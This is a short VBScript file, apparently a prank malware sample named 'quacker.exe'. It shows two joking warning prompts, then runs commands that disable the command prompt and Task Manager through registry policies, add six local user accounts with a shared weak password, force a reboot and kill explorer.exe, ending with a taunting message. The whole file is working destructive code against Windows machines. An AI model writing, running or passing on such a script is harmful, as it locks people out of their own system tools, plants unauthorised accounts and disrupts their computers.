Set oShell = CreateObject("WScript.Shell")
Dim intAnswer

intAnswer = MsgBox("HEY!!! this is scary malware. do not run this will #### ur pc continue?", vbYesNo, "quacker.exe")

If intAnswer = vbYes Then
    intAnswer = MsgBox("final chance to say no. continue?", vbYesNo, "quacker.exe - Final Chance")

    If intAnswer = vbYes Then
        ' Wait for 5 seconds before executing further commands
        oShell.Run "cmd.exe /C REG ADD HKCU\Software\Policies\Microsoft\Windows\System"
        oShell.Run "cmd.exe /C REG ADD HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 2"
        oShell.Run "cmd.exe /C REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System"
        oShell.Run "cmd.exe /C REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1"
        oShell.Run "cmd.exe /C net user quacker1 quack /add"
        oShell.Run "cmd.exe /C net user quacker2 quack /add"
        oShell.Run "cmd.exe /C net user quacker3 quack /add"
        oShell.Run "cmd.exe /C net user quacker4 quack /add"
        oShell.Run "cmd.exe /C net user quacker5 quack /add"
        oShell.Run "cmd.exe /C net user quackermad quack /add"
        ' Shutdown command
        oShell.Run "cmd.exe /C shutdown /r /c ""quackers-is-mad.exe - U HAVE MADE ME MAD. SAY BYE TO UR PC LOLOLOL"""
        
        ' Taskkill command
        oShell.Run "cmd.exe /C taskkill /f /im explorer.exe"

        ' Start MS Paint
        oShell.Run "cmd.exe /C start mspaint"

        WScript.Sleep 5000
        
        ' Final message
        MsgBox "draw with the last seconds with your pc", vbOk, "quacker.exe"
    Else
        WScript.Quit
    End If
Else
    WScript.Quit
End If
